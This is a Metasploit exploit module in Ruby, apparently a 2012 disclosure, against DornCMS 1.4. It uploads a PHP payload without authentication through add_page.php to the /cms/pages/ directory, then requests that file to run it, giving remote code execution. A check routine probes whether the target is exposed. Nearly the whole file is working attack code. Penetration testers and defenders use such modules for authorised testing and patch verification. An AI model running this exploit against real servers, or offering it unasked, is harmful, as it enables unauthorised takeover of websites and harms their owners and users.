require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => "DornCMS 1.4 (add_page.php) Arbitrary File Upload Vulnerability",
      'Description'    => %q{
          This module exploits a vulnerability found in Dorn Content Management
        Script (CMS), version 1.4.  By abusing the add_page.php file,the Attacker
        can upload/add a new file (.php) to the /cms/pages/ directory without any
        authentication, which results in arbitrary code execution.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'KedAns-Dz <ked-h[at]1337day.com>', #Discovery PoC and Metasploit
        ],
      'References'     =>
        [
          ['URL', 'this p0c is 0-day'], # New 0day
        ],
      'Payload'        =>
        {
          'BadChars' => "\x00"
        },
      'DefaultOptions'  =>
        {
          'ExitFunction' => "none"
        },
      'Platform'       => ['php'],
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          ['DornCMS 1.4', {}]
        ],
      'Privileged'     => false,
      'DisclosureDate' => "Mai 25 2012",
      'DefaultTarget'  => 0))

      register_options(
        [
          OptString.new('TARGETURI', [true, 'The base path to dorncms', '/dorncms_1.4'])
        ], self.class)
  end

  def check
    uri = target_uri.path
    uri << '/' if uri[-1,1] != '/'

    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "#{uri}site/cms/add_page.php"
    })

    if res and res.code == 200 and res.body.empty?
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Safe
    end
  end

  def exploit
    uri = target_uri.path
    uri << '/' if uri[-1,1] != '/'

    peer = "#{rhost}:#{rport}"
    payload_name = Rex::Text.rand_text_alpha(rand(5) + 5) + '.php'

    post_data = "--1337day\r\n"
    post_data << "Content-Disposition: form-data; name=\"Filedata\"; filename=\"#{payload_name}\"\r\n\r\n"
  post_data << "Content-Type : text/html;\r\n"
    post_data << "<?php "
    post_data << payload.encoded
    post_data << " ?>\r\n"
    post_data << "--1337day\r\n"

    print_status("#{peer} - Sending PHP payload (#{payload_name})")
    res = send_request_cgi({
      'method' => 'POST',
      'uri'    => "#{uri}site/cms/add_page.php",
      'ctype'  => 'multipart/form-data; boundary=1337day',
      'data'   => post_data
    })

    if not res or res.code != 200 or res.body !~ /#{payload_name}/
      print_error("#{peer} - I don't think the file was uploaded !")
      return
    end

    print_status("#{peer} - Executing PHP payload (#{payload_name})")
    # Execute our payload
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "#{uri}site/cms/pages/#{payload_name}"
    })

    if res and res.code != 200
      print_status("#{peer} - Server returns #{res.code.to_s}")
    end
  end
